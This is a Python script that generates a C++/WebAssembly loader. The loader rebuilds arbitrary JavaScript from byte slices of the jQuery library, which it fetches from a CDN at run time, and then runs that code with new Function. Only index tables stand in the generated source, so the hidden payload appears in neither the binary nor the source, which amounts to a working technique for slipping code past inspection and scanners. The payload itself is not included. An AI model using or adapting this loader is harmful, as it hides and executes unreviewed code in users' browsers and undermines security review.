import os
from urllib.request import urlopen


def preprocessing(message_path):
    with open(message_path, 'rb') as f:
        message = f.read()

    data = urlopen("https://code.jquery.com/jquery-3.4.1.min.js").read()

    tabel_idxs = []
    already_found = 0
    current_find = message
    while current_find != bytes(0):
        idx = data.find(current_find)
        if idx != -1:
            tabel_idxs.append((idx, len(current_find)))
            already_found += len(current_find)
            current_find = message[already_found:]
        else:
            current_find = current_find[:-1]

    if already_found != len(message):
        raise Exception("Couldn't find all chars")

    lines = ["idxs_table[%s] = %s;\tidxs_table[%s + %s] = %s;"
             % (str(i), str(idx[0]), str(len(tabel_idxs)), str(i), str(idx[1]))
             for i, idx in enumerate(tabel_idxs)]

    return lines


def generate_main(lines):
    return """#include <emscripten.h>
#include <string>
#include <iostream>
#include <sstream>

using namespace std;

EM_JS(void, run_code, (const char* str), {
     new Function(UTF8ToString(str))();
});

EM_JS(char *, get_jquery, (), {
    var request = new XMLHttpRequest();
    request.open('GET', 'https://code.jquery.com/jquery-3.4.1.min.js', false);  // `false` makes the request synchronous
    request.send(null);

    if (request.status === 200) {
        var text = request.responseText;
        var lengthBytes = lengthBytesUTF8(text) + 1;
        var stringOnWasmHeap = _malloc(lengthBytes);
        stringToUTF8(text, stringOnWasmHeap, lengthBytes);
        return stringOnWasmHeap;
    } else {
        return null;
    }
});


int main() {
    int len = %d;
    int *idxs_table = new int[2*len];
    
    %s
    
    char* tmp = get_jquery();
    if (!tmp) return 1;
    string data(tmp);

    ostringstream oss("");
    for (int temp = 0; temp < len; temp++)
        oss << data.substr(idxs_table[temp], idxs_table[len + temp]);
    run_code(oss.str().c_str());

    delete[] idxs_table;
    delete[] tmp; 
}
""" % (len(lines), "\n\t".join(lines))


def main():
    message_path = r"..\code\code.txt"

    lines = preprocessing(message_path)
    with open("../src/main.cpp", "w") as f:
        f.write(generate_main(lines))


if __name__ == "__main__":
    main()
